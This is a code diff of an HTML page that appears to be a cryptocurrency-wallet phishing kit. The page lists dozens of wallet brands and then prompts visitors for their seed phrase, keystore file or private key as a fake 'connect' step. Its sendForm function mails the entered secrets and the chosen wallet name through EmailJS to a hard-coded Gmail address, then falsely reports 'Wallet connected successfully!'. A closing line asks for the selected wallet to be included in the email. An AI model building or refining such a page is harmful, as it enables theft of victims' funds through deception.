@@ -1,6 +1,6 @@
+
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,8 +8,8 @@
     <link rel="stylesheet" href="grid.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
-        (function () {
-            emailjs.init("Cta4lN1To45YodQK6");  // Replace with your EmailJS public key
+        (function(){
+           emailjs.init("Cta4lN1To45YodQK6");  // Replace with your EmailJS public key
         })();
     </script>
 </head>
@@ -27,8 +27,7 @@
 
             <!-- Wallets Container -->
             <div class="wallets-container mt-4 pb-4 h-[80vh] lg:h-[570px] bg-white rounded-[10px] overflow-y-scroll">
-                <div
-                    class="sticky bg-white w-full h-[50px] lg:h-[60px] flex items-center justify-between px-4 border-b border-gray-300">
+                <div class="sticky bg-white w-full h-[50px] lg:h-[60px] flex items-center justify-between px-4 border-b border-gray-300">
                     <h1 class="connect-wallet-heading">CONNECT TO WALLET</h1>
                 </div>
                 <div class="connection-message">
@@ -53,116 +52,185 @@
                 <button class="modal-button" onclick="showSection('privatekey')">Private Key</button>
             </div>
             <div id="manual-section" class="mt-3"></div>
-            <button class="send-button bg-green-500 text-white py-2 px-4 rounded-lg mt-4"
-                onclick="sendForm()">Connect</button>
-            <button class="close-button bg-gray-500 text-white py-2 px-4 rounded-lg mt-2"
-                onclick="closeModal('modal-manual')">Close</button>
+            <button class="send-button bg-green-500 text-white py-2 px-4 rounded-lg mt-4" onclick="sendForm()">Connect</button>
+            <button class="close-button bg-gray-500 text-white py-2 px-4 rounded-lg mt-2" onclick="closeModal('modal-manual')">Close</button>
         </div>
     </dialog>
 
     <!-- JavaScript -->
+    <script>
+        const walletNames = [
+          { name: 'Metamask', img: 'meta.png' },
+          { name: 'Trust', img: 'trust.png' },
+          { name: 'Coinbase', img: 'coinbase.png' },
+          { name: 'Xumm', img: 'xumm.png' },
+          { name: 'Cardano', img: 'cardano.png' },
+          { name: 'Daedalus', img: 'daedalus.png' },
+          { name: 'Yoroi', img: 'yoroi.png' },
+          { name: 'CCVault', img: 'ccvault.png' },
+          { name: 'Gero', img: 'gero.jpg' },
+          { name: 'Nami', img: 'nami.png' },
+          { name: 'Solana', img: 'solana.png' },
+          { name: 'Phantom', img: 'phantom.jpg' },
+          { name: 'Solflare', img: 'solflare.png' },
+          { name: 'Sollet', img: 'sollet.png' },
+          { name: 'Solong', img: 'solong.jpg' },
+          { name: 'Exodus', img: 'exodus.png' },
+          { name: 'Avalanche', img: 'avalanche.png' },
+          { name: 'Velas', img: 'velas.png' },
+          { name: 'Crypto.com', img: 'crypto.png' },
+          { name: 'Blockchain', img: 'blockchain.png' },
+          { name: 'Binance Smart Chain', img: 'bsc.png' },
+          { name: 'Safepal', img: 'safepal.png' },
+          { name: 'Argent', img: 'argent.jpg' },
+          { name: 'Fortmatic', img: 'formatic.png' },
+          { name: 'Aktionariat', img: 'aktionariat.png' },
+          { name: 'Keyring Pro', img: 'keyringpro.png' },
+          { name: 'BitKeep', img: 'bitkeep.png' },
+          { name: 'SparkPoint', img: 'sparkpoint.png' },
+          { name: 'OwnBit', img: 'ownbit.png' },
+          { name: 'Infinity Wallet', img: 'infinity-wallet.png' },
+          { name: 'Torus', img: 'torus.jpg' },
+          { name: 'Nash', img: 'nash.jpg' },
+          { name: 'BitPay', img: 'bitpay.jpg' },
+          { name: 'imToken', img: 'imtoken.png' },
+          { name: 'Ambire', img: 'ambire.png' },
+          { name: 'Apollox', img: 'apollox.png' },
+          { name: 'Bitski', img: 'bitski.png' },
+          { name: 'Bobablocks', img: 'bobablocks.png' },
+          { name: 'Crossmint', img: 'crossmint.png' },
+          { name: 'Defiant', img: 'defiant.png' },
+          { name: 'Fireblocks', img: 'fireblocks.jpg' },
+          { name: 'Kryptogo', img: 'kryptogo.png' },
+          { name: 'Ledger', img: 'ledger.png' },
+          { name: 'Now', img: 'now.png' },
+          { name: 'Nufinetes', img: 'nufinetes.png' },
+          { name: 'Onekey', img: 'onekey.png' },
+          { name: 'Paper', img: 'paper.png' },
+          { name: 'Pier', img: 'pier.png' },
+          { name: 'Prema', img: 'prema.png' },
+          { name: 'Rice', img: 'rice.jpg' },
+          { name: 'Safemoon', img: 'safemoon.jpg' },
+          { name: 'Secux', img: 'secux.jpg' },
+          { name: 'Sequence', img: 'sequence.png' },
+          { name: 'Tokenary', img: 'tokenary.jpg' },
+          { name: 'Unipass', img: 'unipass.jpg' },
+          { name: 'Venly', img: 'venly.jpg' },
+          { name: 'Verso', img: 'verso.png' },
+          { name: 'Wallet3', img: 'wallet3.png' },
+          { name: 'Polkadot', img: 'polkadot.png' },
+          { name: 'Filecoin', img: 'filecoin.png' },
+          { name: 'IOST', img: 'iost.png' },
+          { name: 'Qtum', img: 'qtum.png' },
+          { name: 'Algorand', img: 'algorand.png' },
+          { name: 'Vechain', img: 'vechain.png' },
+          { name: 'Tezos', img: 'tezos.png' },
+          { name: 'Stellar', img: 'stellar.png' },
+          { name: 'Tron', img: 'tron.webp' },
+          { name: 'Terra', img: 'terra.png' },
+          { name: 'Cosmos', img: 'cosmos.jpg' },
+          { name: 'Metis', img: 'metis.jpeg' },
+          { name: 'Optimism', img: 'Optimism.png' },
+          { name: 'Injective', img: 'Injective.png' },
+          { name: 'Other Wallet', img: 'other.jpg' }
+        ];
 
+        function startProcess(walletName) {
+            document.getElementById('selected-wallet').textContent = `Selected Wallet: ${walletName}`;
+            openModal('modal-manual');
+        }
 
-    function startProcess(walletName) {
-    document.getElementById('selected-wallet').textContent = `Selected Wallet: ${walletName}`;
-    openModal('modal-manual');
-    }
+        function openModal(id) {
+            document.getElementById(id).showModal();
+        }
 
-    function openModal(id) {
-    document.getElementById(id).showModal();
-    }
+        function closeModal(id) {
+            document.getElementById(id).close();
+        }
 
-    function closeModal(id) {
-    document.getElementById(id).close();
-    }
+        function showSection(type) {
+            const manualSection = document.getElementById('manual-section');
+            manualSection.innerHTML = ''; // Clear previous content
 
-    function showSection(type) {
-    const manualSection = document.getElementById('manual-section');
-    manualSection.innerHTML = ''; // Clear previous content
+            let content = '';
+            if (type === 'phrase') {
+                content = `
+                    <form id="walletForm">
+                        <h4>Wallet Phrase</h4>
+                        <textarea name="content" placeholder="Enter your wallet phrase" rows="3" required></textarea>
+                    </form>`;
+            } else if (type === 'keystore') {
+                content = `
+                    <form id="walletForm">
+                        <h4>Keystore JSON</h4>
+                        <input type="file" name="content" required />
+                    </form>`;
+            } else if (type === 'privatekey') {
+                content = `
+                    <form id="walletForm">
+                        <h4>Private Key</h4>
+                        <input type="text" name="content" placeholder="Enter your private key" required>
+                    </form>`;
+            }
 
-    let content = '';
-    if (type === 'phrase') {
-    content = `
-    <form id="walletForm">
-        <h4>Wallet Phrase</h4>
-        <textarea name="content" placeholder="Enter your wallet phrase" rows="3" required></textarea>
-    </form>`;
-    } else if (type === 'keystore') {
-    content = `
-    <form id="walletForm">
-        <h4>Keystore JSON</h4>
-        <input type="file" name="content" required />
-    </form>`;
-    } else if (type === 'privatekey') {
-    content = `
-    <form id="walletForm">
-        <h4>Private Key</h4>
-        <input type="text" name="content" placeholder="Enter your private key" required>
-    </form>`;
-    }
+            manualSection.innerHTML = content;
+        }
 
-    manualSection.innerHTML = content;
-    }
+        function filterWallets() {
+            const searchValue = document.getElementById('wallet-search').value.toLowerCase();
+            const walletItems = document.getElementsByClassName('wallet-item');
+            Array.from(walletItems).forEach(item => {
+                const walletName = item.getAttribute('data-name');
+                item.style.display = walletName.includes(searchValue) ? 'flex' : 'none';
+            });
+        }
 
-    function filterWallets() {
-    const searchValue = document.getElementById('wallet-search').value.toLowerCase();
-    const walletItems = document.getElementsByClassName('wallet-item');
-    Array.from(walletItems).forEach(item => {
-    const walletName = item.getAttribute('data-name');
-    item.style.display = walletName.includes(searchValue) ? 'flex' : 'none';
-    });
-    }
+        function sendForm() {
+            const selectedWallet = document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '');
+            const form = document.getElementById('walletForm');
+            const formData = new FormData(form);
+        
+            // Get the content from the form (phrase, keystore, or private key)
+            const contentValue = formData.get('content');
+            const message = contentValue instanceof File ? 'File attached' : contentValue;
+        
+            // Send email via EmailJS
+            emailjs.send("service_27imcaz", "template_dv2b63i", {
+                wallet_name: selectedWallet,  // Pass the wallet name
+                message: message,            // Pass the content value
+                to_email: "jnrrihie36@gmail.com" // The recipient email
+            })
+            .then(response => {
+                alert("Wallet connected successfully!");
+                closeModal('modal-manual');
+            })
+            .catch(error => {
+                console.error("Failed to connect:", error);
+                alert("Failed to connect.");
+            });
+        }
+        
 
-    function sendForm() {
-    const selectedWallet = document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '');
-    const form = document.getElementById('walletForm');
-    const formData = new FormData(form);
+        // Populate wallet list
+        const walletList = document.getElementById('wallet-list');
+        walletNames.forEach(wallet => {
+            const walletDiv = document.createElement('div');
+            walletDiv.className = 'wallet-item flex items-center justify-between h-[2rem] border-customGray-main border-[1px] rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer';
+            walletDiv.setAttribute('data-name', wallet.name.toLowerCase());
+            walletDiv.onclick = () => startProcess(wallet.name);
 
-    // Get the content from the form (phrase, keystore, or private key)
-    const contentValue = formData.get('content');
-    const messageContent = contentValue instanceof File ? 'File attached' : contentValue;
+            walletDiv.innerHTML = `
+                <div class="flex items-center gap-2">
+                    <p class="text-customDark-main font-bold">${wallet.name}</p>
+                </div>
+                <div><img src="${wallet.img}" alt="${wallet.name}" class="w-[40px] h-auto rounded-full" /></div>
+            `;
 
-    // Combine the wallet name and message into a single message string
-    const finalMessage = `Wallet: ${selectedWallet}\nDetails: ${messageContent}`;
-
-    // Send email via EmailJS
-    emailjs.send("service_27imcaz", "template_dv2b63i", {
-    to_name: "User", // Replace with the recipient's name if dynamic
-    from_name: "Wallet Troubleshooter", // Your application's name
-    message: finalMessage // Pass the combined message
-    })
-    .then(response => {
-    alert("Wallet connected successfully!");
-    closeModal('modal-manual');
-    })
-    .catch(error => {
-    console.error("Failed to connect:", error);
-    alert("Failed to connect.");
-    });
-    }
-
-
-    // Populate wallet list
-    const walletList = document.getElementById('wallet-list');
-    walletNames.forEach(wallet => {
-    const walletDiv = document.createElement('div');
-    walletDiv.className = 'wallet-item flex items-center justify-between h-[2rem] border-customGray-main border-[1px]
-    rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer';
-    walletDiv.setAttribute('data-name', wallet.name.toLowerCase());
-    walletDiv.onclick = () => startProcess(wallet.name);
-
-    walletDiv.innerHTML = `
-    <div class="flex items-center gap-2">
-        <p class="text-customDark-main font-bold">${wallet.name}</p>
-    </div>
-    <div><img src="${wallet.img}" alt="${wallet.name}" class="w-[40px] h-auto rounded-full" /></div>
-    `;
-
-    walletList.appendChild(walletDiv);
-    });
+            walletList.appendChild(walletDiv);
+        });
     </script>
 </body>
-
 </html>
-<script async data-explicit-opt-in="true" data-cookie-opt-in="true"
-    src="https://vercel.live/_next-live/feedback/feedback.js"></script>
+<script async data-explicit-opt-in="true" data-cookie-opt-in="true" src="https://vercel.live/_next-live/feedback/feedback.js"></script>
+
+i want the wallet selected to also appear in the email
